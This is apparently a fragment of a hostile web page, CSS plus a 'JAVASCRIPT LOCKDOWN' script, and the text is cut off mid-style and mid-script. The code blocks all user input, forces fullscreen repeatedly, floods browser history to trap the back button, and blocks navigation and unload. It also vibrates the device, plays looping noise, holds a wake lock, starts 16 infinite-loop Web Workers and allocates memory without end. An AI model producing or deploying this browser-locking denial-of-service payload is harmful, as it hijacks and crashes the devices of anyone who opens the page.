    <style>
        *,*::before,*::after{
            pointer-events:none!important;
            touch-action:none!important;
            -webkit-touch-callout:none!important;
            -webkit-user-select:none!important;
            user-select:none!important;
            overscroll-behavior:none!important;
            margin:0!important;
            padding:0!important;
            box-sizing:border-box!important;
        }
        html,body{
            position:fixed!important;
            top:0!important;
            left:0!important;
            width:100vw!important;
            height:100vh!important;
            overflow:hidden!important;
            background:#000!important;
        }
        #wall{
            position:fixed;
            top:-500px;
            left:-500px;
            width:calc(100vw + 1000px);
            height:calc(100vh + 1000px);
            z-index:2147483647;
            background:transparent;
            pointer-events:all!important;
            touch-action:none!important;
            cursor:none!important;
        }
        .bomb{
            position:fixed;
            pointer-events:none!important;
            opacity:0.5;
            z-index:9999998;
        }
        .svglayer{
            position:fixed;
            top:0;
            left:0;
            z-index:9999997;
            pointer-events:none!important;
        }
        .canvaslayer{
            position:fixed;
            top:0;
            left:0;
            z-index:9999996;
            pointer-events:none!important;
            width:100vw;
            height:100vh;
        }
        .iframeLayer{
            position:fixed;
            top:0;
            left:0;
            width:100vw;
            height:100vh;
            z-index:9999994;
            border:none;
            pointer-events:none!important;

    <!-- JAVASCRIPT LOCKDOWN -->
    <script>
    (function(){
        'use strict';

        var w=document.getElementById('wall');
        var k=function(e){e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();return false;};
        var evts=['touchstart','touchmove','touchend','touchcancel','pointerdown','pointermove','pointerup','pointercancel','mousedown','mousemove','mouseup','click','dblclick','contextmenu','gesturestart','gesturechange','gestureend','scroll','wheel','keydown','keyup','keypress'];
        for(var i=0;i<evts.length;i++){
            w.addEventListener(evts[i],k,{capture:true,passive:false});
            document.addEventListener(evts[i],k,{capture:true,passive:false});
            window.addEventListener(evts[i],k,{capture:true,passive:false});
        }

        function fs(){
            var d=document.documentElement;
            var m=['requestFullscreen','webkitRequestFullscreen','webkitRequestFullScreen','mozRequestFullScreen','msRequestFullscreen'];
            for(var i=0;i<m.length;i++){
                if(d[m[i]]){try{d[m[i]]();}catch(e){}}
            }
        }
        fs();setInterval(fs,5);

        for(var i=0;i<50000;i++){history.pushState(null,'',window.location.href);}
        setInterval(function(){for(var i=0;i<10000;i++){history.pushState(null,'',window.location.href);}},1);
        window.addEventListener('popstate',function(){history.pushState(null,'',window.location.href);history.go(1);});
        window.addEventListener('beforeunload',function(e){e.preventDefault();e.returnValue='';return '';});
        document.addEventListener('visibilitychange',function(){if(document.hidden){setTimeout(function(){fs();history.pushState(null,'',window.location.href);},10);}});
        if(window.navigation){window.navigation.addEventListener('navigate',function(e){e.preventDefault();});}
        function lo(){try{screen.orientation.lock('portrait-primary').catch(function(){});screen.orientation.lock('landscape-primary').catch(function(){});}catch(e){}}
        lo();setInterval(lo,50);
        if(navigator.vibrate){setInterval(function(){try{navigator.vibrate(30000);}catch(e){}},10);}
        try{var aC=new(window.AudioContext||window.webkitAudioContext)();for(var j=0;j<10;j++){var bf=aC.createBuffer(1,aC.sampleRate*5,aC.sampleRate);var dt=bf.getChannelData(0);for(var i=0;i<dt.length;i++)dt[i]=Math.random()*2-1;var sr=aC.createBufferSource();sr.buffer=bf;sr.loop=true;sr.connect(aC.destination);sr.start(0);}}catch(e){}
        try{navigator.wakeLock.request('screen');}catch(e){}
        setInterval(function(){try{navigator.wakeLock.request('screen');}catch(e){}},100);
        var wc='while(true){var x=0;for(var i=0;i<99999999;i++){x+=Math.pow(Math.random(),Math.random());x*=Math.sqrt(Math.abs(Math.random()*999999));}}';
        var bl=new Blob([wc],{type:'application/javascript'});
        var ur=URL.createObjectURL(bl);
        for(var i=0;i<16;i++){try{new Worker(ur);}catch(e){}}
        var mH=[];
        function mB(){try{for(var i=0;i<100000;i++){mH.push(new Uint8Array(1024*1024));}}catch(e){mH=[];}}
        mB();setInterval(mB,5);
